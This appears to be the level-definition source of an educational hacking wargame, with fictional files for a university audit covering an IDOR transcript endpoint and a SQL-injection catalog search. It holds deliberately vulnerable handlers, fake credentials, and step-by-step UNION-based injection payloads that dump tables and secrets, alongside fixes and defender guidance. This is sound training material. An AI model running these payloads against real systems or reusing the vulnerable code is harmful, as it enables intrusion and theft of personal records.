  7.  cat lessons-learned.md      Post-mortem (after step 6).
`
        },

        "priya-note.md": {
          type: "file",
          content:
`# Meridian State University — engagement update (day two)

Yesterday's finding closed clean. Carlos deleted the BluePier
backup dir within the hour and proactively notified Cedarwood
Mutual — both moves were faster than I expected, and both
helped. Cedarwood's renewal review now has "Meridian discovered
and remediated within audit window" as the headline note, which
is the best possible framing.

But Carlos mentioned something during the conversation I want
us to look at. He shipped a "quick transcript download" to the
student portal three weeks ago — self-service for students to
grab unofficial transcripts without going through the registrar.
He believes it's safe because it's behind Meridian SSO.

I asked him to send me the endpoint code and a captured SSO
session we can use for testing. Both are in this directory,
along with a note on Meridian's student-ID conventions.

## What I want you to check

Read transcript-api.js. It's short. Then read the captured
session in session.txt and confirm what the middleware does:

  - Does the SSO middleware confirm the request is from a
    logged-in Meridian user? (Yes — the cookie name is real,
    the format is standard, the validator works.)
  - Does the SSO middleware confirm the request is from the
    *student whose transcript is being requested*? (Read the
    code carefully.)

If the answer to the second question is no, that's IDOR — the
endpoint trusts the \`student_id\` URL parameter without
checking ownership. Verify by curl-ing a few of the student IDs
you already have from yesterday's CSV (Aisha Patel, Marcus
Reyes, etc.) and seeing whether the responses come back.

## Rules of engagement

Same as yesterday's controlled-exception authorization, with
one addition: do NOT iterate the API at scale (no scripted
enumeration of the M-187xxxx range, no concurrent requests).
We have written authorization from Carlos for targeted
validation of known IDs — anything beyond that turns this from
"audit" into "unauthorized access to PII at scale" regardless
of the underlying vulnerability.

Specifically:
  - Curl a handful of IDs from yesterday's CSV to confirm IDOR.
  - Read id-conventions.md and try ONE or two low-numbered
    legacy IDs to confirm the pattern extends to system
    accounts.
  - Stop. Document. Send to Carlos.

## Compliance angle

This is a FERPA violation if exploited — transcripts are the
canonical example of an "education record" under 34 CFR §99.3.
An IDOR vulnerability that allows any logged-in student to
pull any other student's transcript is a §99.31 ("conditions
for disclosure") and §99.32 ("recordkeeping requirements")
failure in one move. Same federal-funding existential risk as
yesterday's finding.

Cedarwood Mutual also needs to know if this is real.

— Priya
  2026-04-09, 9:42am
`
        },

        "transcript-api.js": {
          type: "file",
          content:
`// Meridian Student Portal — transcript download endpoint
// Owner: Carlos
// Last updated: 2026-03-26

import express from "express";
import { requireMeridianSSO } from "./middleware/sso.js";
import { db } from "./db.js";

export const router = express.Router();

// Require an active Meridian SSO session for ALL routes in
// this router. The SSO middleware reads the session cookie,
// validates it against the SSO provider, populates req.session
// with { studentId, email, name, sessionExpires }, and 401s
// if any of that fails.
router.use(requireMeridianSSO);

router.get("/api/transcript", async (req, res) => {
  const studentId = req.query.student_id;
  if (!studentId) {
    return res.status(400).json({ error: "missing student_id" });
  }

  // Pull the transcript record for the requested student.
  const transcript = await db.transcripts.findOne({
    student_id: studentId,
  });
  if (!transcript) {
    return res.status(404).json({ error: "not found" });
  }

  return res.json(transcript);
});
`
        },

        "session.txt": {
          type: "file",
          content:
`# Captured Meridian SSO session for audit testing
# Issued to: webapp-svc-monitoring (synthetic account Carlos
# created for the nightly health-check job that pings the
# transcript endpoint to confirm uptime)
# Captured by: Carlos, 2026-04-08 (sent to Priya for the audit)

Cookie: MeridianSSO=eyJzaWQiOiJ3ZWJhcHAtc3ZjLW1vbml0b3JpbmctMjAyNiIsImV4cCI6MjA5MTM0MTY0MH0=; csrf=Y2RmYTczNGItOWY4Yi00ZWQwLWFhMzgtZjQ4ZTQyZjZkM2Q0

# Decoded session payload (base64-decode the value half of the
# MeridianSSO cookie to confirm):
#   sid: webapp-svc-monitoring-2026
#   exp: 2036-04-09T08:14:00Z   (long-lived service-account
#                                token — itself a finding)
#
# This session passes Carlos's requireMeridianSSO middleware,
# which is all the transcript endpoint checks before serving
# the requested transcript. The middleware never compares the
# session's identity against the student_id URL parameter.
#
# That's the bug.
`
        },

        "id-conventions.md": {
          type: "file",
          content:
`# Meridian State University — student-ID conventions
# Carlos sent these over with the audit materials so we'd know
# what's in scope.

Current students:      M-187xxxx   (issued 2018-onward, sequential
                                    by enrollment date)
Former students:       M-XXXXXXX   (range varies — 100000-999999
                                    depending on enrollment year)
Legacy / system:       M-000xxxx   (BluePier-era, created 2021-2023
                                    for testing, demo accounts,
                                    acceptance-QA scripts, etc.)

# The 8 IDs from yesterday's students_export_2023.csv are good
# starting points for confirming the IDOR — pick a handful and
# curl them. Aisha Patel M-1872941, Marcus Reyes M-1872995,
# Jordan Smith M-1873041, etc.
#
# Carlos noted: "We never finished migrating off the legacy
# M-000xxxx range. They're still in the database. The student-
# facing UI hides them but the API doesn't filter."
#
# That's its own finding — once IDOR is confirmed, try a low-
# numbered legacy ID. Whatever BluePier left behind is fair
# game for documenting the blast radius.
#
# — Priya
`
        },

        "lessons-learned.md": {
          type: "file",
          content:
`══════════════════════════════════════════════════════════════
  POST-MORTEM — what you just found, and why it matters
══════════════════════════════════════════════════════════════

You just confirmed that Carlos's transcript-download endpoint
hands out any student's transcript to any logged-in Meridian
user. The SSO middleware confirms the requester is authenticated;
it never confirms the requester is the *student whose record
is being requested*. Any current Meridian student — and, by
extension, any attacker with a valid student session — can
pull any other student's transcript by varying the
\`student_id\` URL parameter.

You also found, by curl-ing a legacy account ID, that
BluePier Digital left a system account in the database (the
"M-0000001" demo) whose advisor_notes field carries a live
service-account credential in plain text. The student-facing
UI hides system accounts; the API does not. The credential is
the level2 breadcrumb, and it lives there because BluePier
needed somewhere to stash it during 2023 acceptance testing
and decided an advisor_notes field on a demo account was a
reasonable choice. It was not.

Two distinct failures stack here:

  1. The transcript endpoint trusts the \`student_id\` URL
     parameter without checking ownership. Authentication
     ≠ authorization. The middleware does the first; nothing
     does the second.
  2. The student-record schema includes a free-form notes
     field, and the field carries data that should never have
     been written there in the first place — a credential
     "stashed for later" by a vendor who never came back to
     clean up.

─── THE BLUNT VERSION ────────────────────────────────────────

Insecure Direct Object Reference (IDOR) is, by the count of
several published bug-bounty reports, the most-disclosed
vulnerability class on modern web applications. The pattern
is consistent: an endpoint takes a resource identifier as an
input (a URL parameter, a JSON body field, a path segment),
looks the resource up in the database, and returns it —
without checking that the authenticated caller has any
relationship to the resource being returned.

The vulnerability has been on the OWASP Top 10 in some form
since 2007 (when "Insecure Direct Object References" was
A04:2007 in its own right). In the 2017 reshuffle it was
folded into the broader A05:2017 Broken Access Control
category, which moved to the #1 slot in OWASP Top 10:2021
and stayed at #1 in the 2025 edition. The OWASP API Security
Top 10 (a separate list focused on API-specific failures)
has had "Broken Object Level Authorization" as its API1 since
the list was created in 2019 — IDOR's API expression.

The reason the bug keeps showing up is that frameworks make
authentication easy ("add this middleware to require a logged-
in user") and authorization hard ("you have to write per-route
logic that maps the authenticated identity to the resource
being requested"). Carlos used the framework's authentication
middleware correctly. He just stopped there.

─── THE CONSULTING-FIRM ANGLE ────────────────────────────────

For Meridian specifically, this is a FERPA-grade finding on
top of an insurance-renewal-grade finding. Transcripts are
the textbook example of an "education record" under 34 CFR
§99.3. An IDOR vulnerability that allows any logged-in
student to pull any other student's transcript fails both
§99.31 (conditions for disclosure of PII from education
records) and §99.32 (recordkeeping for disclosures) — the
disclosed records have no audit trail, no consent
documentation, and no logged recipient list.

The federal-funding question (FERPA's enforcement mechanism
is "the federal government can withdraw your funding," which
for a public university is existential) puts this in the
"general counsel needs to know today" category.

For Cedarwood Mutual: yesterday's finding played as
"discovered + remediated within audit window." Today's, if
remediated equally fast, can play the same way. The same
24-hour-fix mechanic applies — the code change is genuinely
small.

For Driftwood: Carlos is the easiest client we have. He
takes feedback well; he ships fixes fast; he proactively
loops in the right stakeholders. The pattern here is "junior
developer who needs the layered model articulated, not
junior developer who's bad at this." The conversation today
is one whiteboard diagram (authn vs authz) and one code
review.

─── FRAMEWORKS THAT COVER THIS ───────────────────────────────

Three weaknesses that are really one missing check.

  CWE-639   Authorization Bypass Through User-Controlled Key —
            the IDOR itself.
  CWE-285   Improper Authorization.
  CWE-862   Missing Authorization.

  NIST SP 800-53 AC-3 (Access Enforcement) is the control.
  Authentication passed here; authorization was never attempted,
  and those are two different controls.

  FERPA is the regime, and it carries NO breach-notification
  duty and no fine schedule. Enforcement runs through the
  Department of Education's funding-withdrawal authority and the
  annual FSA attestation. Any notification clock here comes from
  STATE law attaching to the PII. Two exposures, two timelines.

─── MITRE ATT&CK MAPPING ─────────────────────────────────────

  T1190     — Exploit Public-Facing Application. IDOR-style
              exploitation against a public-facing API.
  T1213     — Data from Information Repositories. The
              transcripts database is the information
              repository being mined.

─── WHAT A DEFENDER SHOULD ACTUALLY DO ───────────────────────

  1. Fix the endpoint. One line of code: check that
     \`req.query.student_id === req.session.studentId\`
     before serving (or, for non-self queries by registrar
     staff, gate by role). The fix is genuinely
     one-liner-sized for the self-service case; a
     more-complete fix uses a centralized authz helper.

  2. Switch to centralized authorization. Per-route
     ownership checks are fragile because every new route
     needs the check added. Centralize with an OPA-style
     policy engine, casbin, oso, or the framework's own
     authorization primitives. Define authz as data, not
     scattered code.

  3. Replace predictable IDs with unguessable identifiers.
     UUIDv4 / ULID / NanoID. Predictable IDs aren't the
     vulnerability (the authz check is), but unguessable
     IDs make exploitation substantially more expensive
     even if the authz check fails. Defense in depth.

  4. Audit the entire codebase for sibling endpoints with
     the same pattern. The shape "endpoint takes ID as
     input, looks up record, returns record" repeats many
     times in any application of size. Each instance needs
     the authz check. Semgrep and CodeQL both have rule
     packs for this pattern (search for "IDOR" or "BOLA"
     in their rule registries).

  5. Decommission the BluePier demo account. The advisor_
     notes field should not contain credentials; the demo
     account itself should not exist; the system-account
     name space should be filtered at the schema or query
     layer so it never leaks via APIs. Rotate the
     credential the advisor_notes field exposed.

  6. Add SIEM detection for transcript-API access patterns
     that don't match the session's owning student. The
     telemetry needed is "for each request to /api/
     transcript, log (session.studentId, query.student_id,
     match)." Any row where the two don't match is, post-
     remediation, either a registrar action (legitimate)
     or an exploitation attempt (alert-worthy).

  7. For the long term: assume the data is going to be
     accessed by the wrong user eventually. Apply
     row-level security at the database layer (PostgreSQL's
     RLS, MySQL with views, MongoDB's field-level
     redaction). Treat application-level authz as one
     layer, not the only one.

─── CHECK YOURSELF ───────────────────────────────────────────

Before you move on, see if you can answer these without
scrolling back. If one stalls you, that's the part worth
re-reading.

  1. Every request in the logs is authenticated and well-formed.
     What does that do to your detection strategy?

  2. You demonstrated the flaw on one record. Why does the
     finding still cover every transcript?

  3. Why is the leftover BluePier demo account a separate
     finding from the IDOR?

─── GO DEEPER ────────────────────────────────────────────────

  https://www.d3cyph3r.com/walkthroughs/web/level1.html

The walkthrough covers the full control mapping, the
certification objectives, how IDOR is scoped and reported, the
real-world cases including First American, and a Sigma rule that
counts distinct object ids per session.

From the terminal:    walkthrough

─── CLOSING THOUGHT ──────────────────────────────────────────

Authentication asks "who are you?" Authorization asks "are
you allowed to do this?" Frameworks make the first question
easy. The second question is yours to answer, every time, on
every route, on every resource. Carlos's mistake is the most
common version of this mistake. The fix is small. The
diagnostic — "the middleware exists, the check inside the
handler doesn't" — is the lesson worth remembering.

Return to the lobby:    ssh guest@d3cyph3r
`
        },

      },
    },
  },

  // ── level 2 — "Meridian's catalog search" (SQLi) ─────────────────
  // Day three at Meridian State University. The level1 transcript IDOR
  // closed the same afternoon; Carlos handed over the portal-svc
  // credential recovered from the BluePier demo account and pointed the
  // audit at one more piece of BluePier's 2021 work: the public
  // course-catalog search at catalog.meridian.edu. The handler glues the
  // `q` query parameter straight into a SQL string (CWE-89). The player
  // probes with a single quote (verbose MySQL error — CWE-209 bonus +
  // the constructed query leaked back), confirms with a tautology, counts
  // columns with ORDER BY / UNION SELECT NULL, fingerprints via
  // @@version/user()/database(), enumerates information_schema, and dumps
  // the app_config table to recover the plaintext `meridian_dbadmin`
  // credential — the level3 breadcrumb. The same injection reaches the
  // FERPA-protected `students` table because BluePier pointed the public
  // catalog at the student portal's database with an over-privileged
  // account. Lesson stack: CWE-89 (SQLi) + OWASP A05:2025 Injection, with
  // CWE-209 (verbose errors), CWE-312/522 (plaintext credential), CWE-250
  // (least privilege), and FERPA (34 CFR Part 99).
  //
  // ENGINE: uses the v1.28.0 `level.sqli` endpoint, executed for real by
  // js/commands/sqli.js — curl substitutes the raw `q` value into the
  // template and runs the resulting query, so ANY valid injection payload
  // behaves like a real vulnerable MySQL endpoint (not a pre-baked URL
  // map). The breadcrumb lives in app_config and is reached through the
  // UNION, never via a flat file.
  "level2@web": {
    password: "meridian-portal-svc-2026",
    track: "web",
    title: "Meridian's catalog search (SQLi)",
    estimatedMinutes: 22,
    playerUser: "portal-svc",
    objective: "Audit Meridian's public course-catalog search at catalog.meridian.edu for SQL injection. Confirm whether the search box prospective students use can be turned into a query against the rest of the database — and document the blast radius if it can.",
    lesson: "Day three at Meridian. The level1 transcript IDOR closed the same afternoon — Carlos shipped the one-line ownership check and decommissioned the BluePier demo account. While cleaning up he recovered the portal-svc service credential BluePier had stashed in that demo account and, on a hunch, checked the catalog webapp host — the same key was in its authorized_keys. So you're on catalog.meridian.edu as `portal-svc` now (BluePier reused one service account across hosts; flag it as its own finding). Today's target is the public course-catalog search BluePier wrote in 2021 and Carlos never rewrote — the box prospective students use to browse courses, no login required by design. The search term goes straight into a SQL string. Read welcome.md first, then priya-note.md for the rules of engagement, then read catalog-search.js and exercise the live endpoint with curl. Priya — general counsel cc'd again — wants to know exactly how far that search box reaches.",

    hints: [
      "Probe first: append a single quote to the search term — `curl \"https://catalog.meridian.edu/search?q='\"`. A SQL error means your input reaches the query unescaped (read the echoed query in the error — that verbose error is CWE-209 helping you).",
      "Count the query's columns so a UNION can match: `q=' ORDER BY 1-- -`, then `2`, `3`, `4`... The last number that doesn't error is the column count.",
      "Build a UNION with that many columns, padding with NULL and putting readable values where the page prints them: `q=' UNION SELECT @@version,user(),database(),NULL-- -`.",
      "Enumerate the schema through the UNION: `... UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -`, then list a table's columns with `information_schema.columns WHERE table_name='app_config'`.",
      "Dump `app_config` — configuration tables are where credentials hide. The DB-admin credential there is the breadcrumb to `level3@web`.",
    ],

    // v1.10.0 BONUS FINDS — both surface real-world anti-patterns that
    // ride alongside the injection. Orthogonal to the credential chain.
    bonusFinds: [
      {
        id:   "verbose-sql-errors",
        name: "Verbose database errors in production",
        hint: "The catalog endpoint returns the raw database error AND the exact SQL it tried to run (CWE-209). That single 500 response hands an attacker the backend (MySQL), the query shape, and the column names — turning blind trial-and-error into a guided exercise. Error detail belongs in server logs, never in an HTTP response to a client.",
        trigger: { command: "curl", outputContains: "Database query failed" },
      },
      {
        id:   "no-waf-no-ratelimit",
        name: "Public endpoint with no WAF and no rate limiting",
        hint: "deploy-notes.md shows catalog.meridian.edu was stood up on a separate origin that BluePier never put behind the Cloudflare WAF — so there is no WAF and no rate limiting in front of /api/search. A WAF doesn't fix injection (parameterizing does), but its absence means automated tooling like sqlmap can hammer the endpoint — and the database directly — unthrottled.",
        trigger: { command: "cat", argMatches: /deploy-notes/, outputContains: "no WAF and no rate limiting" },
      },
    ],

    // v1.28.0 VULNERABLE ENDPOINT — see js/commands/sqli.js for the full
    // endpoint shape + supported SQL grammar. The `{INJECT}` marker in
    // `template` is where the raw `q` value is concatenated.
    sqli: {
      "https://catalog.meridian.edu/api/search": {
        param: "q",
        template: "SELECT sku, title, dept, credits FROM courses WHERE title LIKE '%{INJECT}%'",
        columns: ["sku", "title", "dept", "credits"],
        dbVersion: "5.7.38-0ubuntu0.18.04.1",
        dbUser: "meridian_app@localhost",
        dbName: "meridian_portal",
        tables: {
          // The table the search is SUPPOSED to read.
          courses: {
            columns: ["sku", "title", "dept", "credits"],
            rows: [
              { sku: "BIO-101",  title: "Introduction to Biology",   dept: "Biology",          credits: 4 },
              { sku: "BIO-310",  title: "Cell Biology",              dept: "Biology",          credits: 3 },
              { sku: "CS-201",   title: "Data Structures",           dept: "Computer Science", credits: 4 },
              { sku: "CS-301",   title: "Algorithms",                dept: "Computer Science", credits: 4 },
              { sku: "CS-340",   title: "Operating Systems",         dept: "Computer Science", credits: 3 },
              { sku: "ENGL-202", title: "Advanced Composition",      dept: "English",          credits: 3 },
              { sku: "MATH-220", title: "Linear Algebra",            dept: "Mathematics",      credits: 4 },
              { sku: "HIST-115", title: "Pacific Northwest History", dept: "History",          credits: 3 },
            ],
          },
          // FERPA-protected records — reachable through the injection
          // because the public catalog shares the portal's database. Names
          // continue from level0's students_export_2023.csv.
          students: {
            columns: ["student_id", "full_name", "email", "gpa"],
            rows: [
              { student_id: "M-1872941", full_name: "Aisha Patel",  email: "patel.a@meridian.edu",  gpa: 3.91 },
              { student_id: "M-1872995", full_name: "Marcus Reyes", email: "reyes.m@meridian.edu",  gpa: 3.42 },
              { student_id: "M-1873041", full_name: "Jordan Smith", email: "smith.j@meridian.edu",  gpa: 2.88 },
              { student_id: "M-1873100", full_name: "Linh Tran",    email: "tran.l@meridian.edu",   gpa: 3.76 },
              { student_id: "M-1873198", full_name: "Sara Kapoor",  email: "kapoor.s@meridian.edu", gpa: 3.94 },
              { student_id: "M-1873244", full_name: "Olivia Chen",  email: "chen.o@meridian.edu",   gpa: 3.88 },
            ],
          },
          // Staff auth table — passwords are bcrypt-hashed here (the
          // contrast with app_config below: at least these aren't
          // plaintext). Cracking is out of scope for this level.
          staff_users: {
            columns: ["username", "password_hash", "role", "email"],
            rows: [
              { username: "carlos",       password_hash: "$2b$12$Jq8x0Xn3eL5kP2rT9vH1Qu4bW7cR0aS6dF8gH2jK4mN6pQ8sU0wY", role: "developer", email: "carlos@meridian.edu" },
              { username: "pwheeler",     password_hash: "$2b$12$5fD2aB7cE9gH1jK3mN5pQ7sT9vX1zA3cE5gH7jK9mN1pQ3sT5vX7", role: "registrar", email: "wheeler.p@meridian.edu" },
              { username: "bluepier_svc", password_hash: "$2b$12$1aB3cD5eF7gH9iJ1kL3mN5oP7qR9sT1uV3wX5yZ7aB9cD1eF3gH5", role: "admin",     email: "ops@bluepier.example" },
            ],
          },
          // The application's own configuration — credentials and secrets
          // stored, badly, in a database table. The db.admin.* pair is the
          // prize: the database superuser credential, in plaintext.
          app_config: {
            columns: ["config_key", "config_value"],
            rows: [
              { config_key: "app.name",          config_value: "Meridian Course Catalog" },
              { config_key: "smtp.host",         config_value: "smtp.meridian.edu" },
              { config_key: "smtp.user",         config_value: "noreply@meridian.edu" },
              { config_key: "session.secret",    config_value: "kg9F2pX7qZ1mW4dR6tY8-rotate-me" },
              { config_key: "db.host",           config_value: "db.meridian.edu" },
              { config_key: "db.admin.user",     config_value: "meridian_dbadmin" },
              { config_key: "db.admin.password", config_value: "M3rid14n-DBr00t!2026" },
              { config_key: "recaptcha.secret",  config_value: "6Lc2k9wpAAAAAB-meridian-prod" },
            ],
          },
        },
      },
    },

    // curl -I against the bare endpoint returns these (the X-Powered-By
    // header is itself a small fingerprinting leak).
    webHeaders: {
      "https://catalog.meridian.edu/api/search": {
        "HTTP/1.1": "200 OK",
        "Server": "nginx/1.14.0 (Ubuntu)",
        "Content-Type": "application/json; charset=utf-8",
        "X-Powered-By": "Express",
      },
    },

    fs: {
      type: "dir",
      children: {

        "welcome.md": {
          type: "file",
          content:
`─── Meridian Course Catalog / catalog.meridian.edu (portal-svc) ──

Day three at Meridian. Yesterday's transcript IDOR (level1) closed the
same afternoon — Carlos added the ownership check and deleted the
BluePier demo account. While he was in there he found the service
credential BluePier had stashed (portal-svc) and, on a hunch, checked
the catalog webapp host. The same key was in that host's
authorized_keys. So you're now logged in as \`portal-svc\` on
catalog.meridian.edu — a service account BluePier reused across hosts
(flag that; it's a finding on its own).

Today's target is the public course-catalog search — the box
prospective students use to browse Meridian's course list. No login
required; that's intentional and fine. What's NOT fine is what BluePier
did with the search term once it reaches the server.


─── COMMANDS YOU'LL USE TODAY ─────────────────────────────────

  curl <url>      Fetch a URL and print the response body. Quote the
                  WHOLE url so your shell doesn't eat the spaces and
                  quotes in an injection payload:
                      curl "https://host/api/search?q=PAYLOAD"

(No new commands. SQL injection is a TECHNIQUE you apply with curl, not
a tool you install. That's the point.)


─── WHAT SQL INJECTION IS ─────────────────────────────────────

A web app turns your input into a database query. The safe way passes
your input as a PARAMETER, kept separate from the query's code:

    SELECT ... FROM courses WHERE title LIKE ?      <- value bound here

The unsafe way GLUES your input into the query string:

    "SELECT ... FROM courses WHERE title LIKE '%" + q + "%'"

When the app glues, your input is no longer just a value — it becomes
part of the query's CODE. A single quote (') ends the string literal
early and drops you into raw SQL. From there you can:

  - rewrite the WHERE so it matches everything     (' OR 1=1 )
  - bolt a second query onto the first             ( UNION SELECT ... )
  - read tables the search was never meant to touch
    (other students' records, the app's own credentials)

The catalog search only ever intended to read the \`courses\` table. You
are going to make it read the whole database.


─── HOW TO PLAY ───────────────────────────────────────────────

  1.  cat priya-note.md            Rules of engagement (read FIRST).
  2.  cat catalog-search.js        The handler BluePier shipped. Find
                                   the line that glues \`q\` into the SQL.
  3.  cat deploy-notes.md          How the catalog stack is deployed.

  Now exercise the endpoint. Quote every url.

  4.  Normal search — see what it's supposed to do:
        curl "https://catalog.meridian.edu/api/search?q=biology"

  5.  Probe with a single quote — break the SQL on purpose:
        curl "https://catalog.meridian.edu/api/search?q='"
      Read the error. The server hands you the database's complaint AND
      the exact query it tried to run. That's two findings in one.

  6.  Confirm the injection — make the WHERE always true:
        curl "https://catalog.meridian.edu/api/search?q=' OR 1=1-- -"
      Every course comes back. (\`-- -\` is a SQL comment that throws
      away the rest of BluePier's query; the trailing dash makes the
      space required after \`--\` visible.)

  7.  Count the columns — a UNION must match. Walk ORDER BY up until it
      errors, and you know the count:
        curl "https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 4-- -"
        curl "https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 5-- -"
      Four works, five errors -> four columns.

  8.  Fingerprint the database through a UNION:
        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT @@version,user(),database(),NULL-- -"

  9.  Enumerate the tables (information_schema is SQL's own catalog):
        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -"

  10. One table looks like configuration. List its columns, then dump it:
        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='app_config'-- -"
        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT config_key,config_value,NULL,NULL FROM app_config-- -"
      What you pull out of app_config is your way into the next
      engagement.

  11. cat lessons-learned.md       Post-mortem (read after step 10).

Tip: \`zzz\` is a search term that matches no course, so only your
injected rows come back — cleaner than \` OR 1=1\` when you just want
to read the UNION output.`
        },

        "priya-note.md": {
          type: "file",
          content:
`# Meridian State University — engagement update (day three)

Two findings closed in two days. Carlos is the client every consultant
wants: he fixed the transcript IDOR within hours, decommissioned the
BluePier demo account, and self-reported both to Cedarwood Mutual before
I could draft the language. The renewal file now reads "discovered and
remediated within audit window" twice.

The portal-svc credential we recovered from that demo account opened
more doors than expected. Carlos found the same key in the catalog
webapp host's authorized_keys — BluePier wired one service account
across multiple hosts in 2021 and nobody ever pulled it apart. That
reuse is finding number three; note it, we'll write it up.

## What I want you to check

BluePier built the public course-catalog search in 2021. Carlos never
rewrote it. He showed me the handler and admitted he "didn't love" how
the search term gets used but hadn't had time to look closely. I want
to know whether that search box reaches past the course list.

Read catalog-search.js. Then exercise the endpoint:

  - A single-quote probe, to see whether the input breaks the query.
  - If it does: confirm with a tautology, count the columns, and use a
    UNION to reach ONE non-course table to prove the blast radius.

## Rules of engagement

Same FERPA discipline as yesterday, and it matters more here because a
working injection reaches the student records directly:

  - This is AUTHORIZED testing. Carlos and Meridian's GC signed off.
  - PROVE the vulnerability; do not harvest. Pull enough rows to
    demonstrate reach — a handful — and stop. Do NOT dump the full
    students table. "I extracted 30,000 student records to prove a
    point" is not a sentence that survives a deposition.
  - The cleanest proof is the app's OWN secrets (the config table): it
    shows an attacker could seize the whole database without touching a
    single student record first. Lead the writeup with that.

## Compliance angle

A SQL injection on a public, UNAUTHENTICATED endpoint that shares a
database with the student-records system is the worst of the three
findings. No login, no IDOR-style session needed — just a url. Under
FERPA (34 CFR Part 99) every student record reachable this way is an
unauthorized-disclosure risk, and the federal-funding exposure is the
same as days one and two. Cedarwood needs this today.

— Priya
  2026-04-10, 9:15am`
        },

        "catalog-search.js": {
          type: "file",
          content:
`// Meridian Course Catalog — public search endpoint
// Author: BluePier Digital (J. Reynard), 2021
// "Inherited as-is." — Carlos, 2026
//
// Mounted at catalog.meridian.edu/api/search. No auth: the course
// catalog is public information, so anyone can search it. That part is
// fine. The problem is the line marked below.

import express from "express";
import { db } from "./db.js";   // connects as meridian_app, which has
                                // read/write on the WHOLE meridian_portal
                                // schema (see deploy-notes.md)

export const router = express.Router();

router.get("/api/search", async (req, res) => {
  const q = req.query.q || "";

  // BluePier built the query by gluing the search term straight into the
  // SQL string. The term is NOT escaped or bound as a parameter.
  //   >>>  this is the vulnerability  <<<
  const sql =
    "SELECT sku, title, dept, credits FROM courses " +
    "WHERE title LIKE '%" + q + "%'";

  try {
    const rows = await db.query(sql);
    return res.json({ results: rows, count: rows.length });
  } catch (err) {
    // TODO(carlos): stop returning the raw DB error + query in prod.
    // BluePier left this in to "make debugging easier." It makes
    // ATTACKING easier — it hands the caller the exact query and the
    // database's identity for free.
    return res.status(500).json({
      status:  "error",
      message: "Database query failed",
      error:   err.message,
      query:   sql,
    });
  }
});

// The fix is one line: bind the parameter instead of gluing it.
//
//   const sql = "SELECT sku, title, dept, credits FROM courses " +
//               "WHERE title LIKE ?";
//   const rows = await db.query(sql, ['%' + q + '%']);
//
// Bound parameters are treated as VALUES no matter what characters they
// contain. A quote stays a quote; it can never become syntax.`
        },

        "deploy-notes.md": {
          type: "file",
          content:
`# Meridian Course Catalog — deployment notes
# BluePier Digital, 2021. Annotated by Carlos, 2026.

Host:        catalog.meridian.edu  (Ubuntu 18.04, BluePier-provisioned)
Stack:       Node 16 + Express, behind nginx
Database:    db.meridian.edu / schema \`meridian_portal\`
             ** SAME database as the student portal. ** The catalog app
             connects as \`meridian_app\`, which BluePier granted
             read/write on the ENTIRE schema — including students,
             staff_users, and app_config.
             (Carlos: "why does the public catalog need write access to
             the transcripts table? it doesn't.")

Front door:  www.meridian.edu sits behind the Cloudflare WAF. The
             catalog subdomain does NOT — BluePier stood it up on a
             separate origin and never put it behind the WAF. So there
             is no WAF and no rate limiting on this endpoint: requests
             to /api/search hit the application — and the database —
             directly, as fast as a client can send them.

MySQL:       5.7.38. (Carlos: "I keep meaning to upgrade. 5.7 went
             end-of-life October 2023 — no more security patches.")

TODO (Carlos, never got to):
  - parameterize the catalog search query
  - give the catalog a READ-ONLY db user scoped to \`courses\`
  - put catalog.meridian.edu behind the WAF + add rate limiting
  - stop returning raw DB errors to clients
  - move the db.admin credential out of app_config into a secrets manager
  - upgrade off MySQL 5.7`
        },

        "lessons-learned.md": {
          type: "file",
          content:
`══════════════════════════════════════════════════════════════
  POST-MORTEM — what you just found, and why it matters
══════════════════════════════════════════════════════════════

You turned a public course-search box into a query against Meridian's
entire portal database. A single quote in the \`q\` parameter broke out
of the string literal BluePier glued it into; a UNION SELECT let you
append your own query to the catalog's; and information_schema told you
every table name and column to aim at. You pulled the application's own
configuration table — including the plaintext credential for
\`meridian_dbadmin\`, the database's administrative account — out through
a search box that requires no login.

That credential is your entry to the next engagement. But the finding
is bigger than one password: the same injection reaches the \`students\`
table (FERPA-protected records) and \`staff_users\`, because BluePier
pointed the public catalog at the SAME database as the student portal
and gave it read/write on everything.

─── THE BLUNT VERSION ────────────────────────────────────────

SQL injection is what happens when an application builds a query by
gluing untrusted input into the query STRING instead of passing it as a
PARAMETER. Once your input lands inside the query text, it stops being
data and becomes code. The fix has been known and easy for twenty-plus
years — parameterized queries / prepared statements — and the bug still
ships constantly, because gluing strings is the first thing a developer
reaches for and it "works" in every test where nobody types a quote.

BluePier's handler was one line of glue:

    "...WHERE title LIKE '%" + q + "%'"

Everything you did followed from that. The defense is one line too —
bind \`q\` as a parameter and the database treats it as a value no matter
what characters it contains:

    "...WHERE title LIKE ?", ['%' + q + '%']

Two failures stacked on top of the injection and made it worse:

  1. VERBOSE ERRORS. The handler returned the raw database error AND the
     exact SQL it tried to run. That handed you the backend (MySQL), the
     query shape, and your column names for free. Error detail is for
     your logs, not your users.

  2. AN OVER-PRIVILEGED, SHARED DATABASE ACCOUNT. The public catalog
     connects with a user that can read every table in the portal
     schema. A read-only account scoped to \`courses\` would have made
     the injection a non-event — you'd have broken the query and reached
     nothing worth reaching.

─── THE CONSULTING-FIRM ANGLE ────────────────────────────────

This is the worst of the three Meridian findings and it should lead the
report. Days one and two needed something: a guessed path, a captured
session. This one needs a url. No authentication, no login, nothing —
the catalog search is public by design, and BluePier wired it to a
database full of FERPA records.

Frame it for Carlos the way the first two landed: the fixes are small
and he can ship them this week (parameterize the query, scope a
read-only db user, put the subdomain behind the WAF, stop leaking
errors, rotate the exposed \`meridian_dbadmin\` password, upgrade off
MySQL 5.7). Frame it for Cedarwood Mutual as "discovered in audit
window, remediation plan attached." Frame it for the general counsel as
a FERPA matter: every student record was reachable from the open
internet through a search box.

And rotate that database credential immediately — treat it as burned the
moment it appeared in a query response, regardless of who was watching.

─── FRAMEWORKS THAT COVER THIS ───────────────────────────────

Four weaknesses, and the first one sets the severity.

  CWE-89    Improper Neutralization of Special Elements in an SQL
            Command — through a PUBLIC, unauthenticated search.
  CWE-209   Generation of Error Message Containing Sensitive
            Information — the verbose errors that guided it.
  CWE-312   Cleartext Storage of Sensitive Information — the
            DB-admin credential in app_config.
  CWE-250   Execution with Unnecessary Privileges — the app's
            database account reached far past the catalogue.

